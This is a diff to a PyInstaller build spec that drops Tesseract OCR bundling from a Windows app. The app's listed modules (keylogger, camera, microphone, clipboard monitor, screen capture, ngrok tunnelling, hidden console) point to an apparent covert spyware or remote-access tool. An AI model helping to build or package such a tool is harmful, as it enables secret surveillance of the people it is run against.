@@ -1,6 +1,5 @@
 # -*- mode: python ; coding: utf-8 -*-
 import os
-import glob
 from PyInstaller.utils.hooks import collect_all, collect_data_files
 
 block_cipher = None
@@ -41,32 +40,6 @@ try:
 except Exception:
     pass
 
-# ── Tesseract-OCR binaries (installed by CI via choco) ───────────────────────
-_TESS_ROOTS = [
-    r'C:\Program Files\Tesseract-OCR',
-    r'C:\Program Files (x86)\Tesseract-OCR',
-]
-for _root in _TESS_ROOTS:
-    if os.path.isdir(_root):
-        # Main exe
-        _tbin = os.path.join(_root, 'tesseract.exe')
-        if os.path.isfile(_tbin):
-            _binaries.append((_tbin, '.'))
-        # DLLs tesseract needs
-        for _dll in glob.glob(os.path.join(_root, '*.dll')):
-            _binaries.append((_dll, '.'))
-        # Language data — bundle English only to keep size down;
-        # other lang files can be dropped into tessdata/ beside the exe later
-        _tdata = os.path.join(_root, 'tessdata')
-        if os.path.isdir(_tdata):
-            for _td in glob.glob(os.path.join(_tdata, 'eng.*')):
-                _datas.append((_td, 'tessdata'))
-            # also include config files
-            _tcfg = os.path.join(_tdata, 'configs')
-            if os.path.isdir(_tcfg):
-                _datas.append((_tcfg, os.path.join('tessdata', 'configs')))
-        break
-
 # ── Analysis ──────────────────────────────────────────────────────────────────
 a = Analysis(
     ['app.py'],
@@ -105,7 +78,7 @@ a = Analysis(
         # misc stdlib / third-party
         'psutil', 'pyperclip', 'pyngrok',
         'sqlite3', 'pyautogui', 'requests',
-        'configparser', 'pytesseract',
+        'configparser',
         # project modules
         'keylogger', 'screencap', 'controller', 'recorder',
         'camera', 'clipboard_monitor', 'microphone',
@@ -116,7 +89,7 @@ a = Analysis(
         'updater',
     ],
     hookspath=[],
-    runtime_hooks=['rthook_tess.py'],
+    runtime_hooks=[],
     excludes=[],
     win_no_prefer_redirects=False,
     win_private_assemblies=False,
@@ -140,7 +113,7 @@ exe = EXE(
     upx=True,
     # Don't UPX-compress DLLs — UPX can corrupt certain signed DLLs
     upx_exclude=['vcruntime140.dll', 'python3*.dll', 'cv2*.pyd',
-                 '_sounddevice*.pyd', 'tesseract.exe', '*.dll'],
+                 '_sounddevice*.pyd', '*.dll'],
     runtime_tmpdir=None,
     console=False,
     disable_windowed_traceback=False,
